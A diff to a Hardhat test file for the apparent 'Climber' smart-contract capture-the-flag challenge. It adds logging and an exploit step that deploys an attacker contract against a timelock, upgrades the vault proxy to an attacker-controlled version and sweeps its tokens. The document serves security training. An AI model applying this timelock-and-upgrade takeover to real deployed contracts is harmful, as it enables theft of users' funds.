@@ -11,6 +11,11 @@ describe('[Challenge] Climber', function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
         [deployer, proposer, sweeper, attacker] = await ethers.getSigners();
 
+        console.log("Deployer: ", deployer.address)
+        console.log("Proposer: ", proposer.address)
+        console.log("Sweeper: ", sweeper.address)
+        console.log("Attacker: ", attacker.address)
+
         await ethers.provider.send("hardhat_setBalance", [
             attacker.address,
             "0x16345785d8a0000", // 0.1 ETH
@@ -26,6 +31,8 @@ describe('[Challenge] Climber', function () {
             [ deployer.address, proposer.address, sweeper.address ],
             { kind: 'uups' }
         );
+
+        console.log("Vault Owner: ", await this.vault.owner())
 
         expect(await this.vault.getSweeper()).to.eq(sweeper.address);
         expect(await this.vault.getLastWithdrawalTimestamp()).to.be.gt('0');
@@ -53,6 +60,20 @@ describe('[Challenge] Climber', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+        console.log("---------------------")
+
+        this.attackerContract = await (await ethers.getContractFactory("ClimberAttacker", attacker)).deploy(
+            this.timelock.address, 
+            this.vault.address, 
+        )
+        console.log("Attacker Contract Address: ", await this.attackerContract.address);
+        await this.attackerContract.connect(attacker).exploit()
+
+        this.climberVaultV2 = await ethers.getContractFactory('ClimberVaultV2', attacker)
+        const vaultV2 = await upgrades.upgradeProxy(this.vault.address, this.climberVaultV2)
+        console.log("Vault V2: ", vaultV2.address);
+
+        await vaultV2.connect(attacker).sweepFunds(this.token.address);
     });
 
     after(async function () {
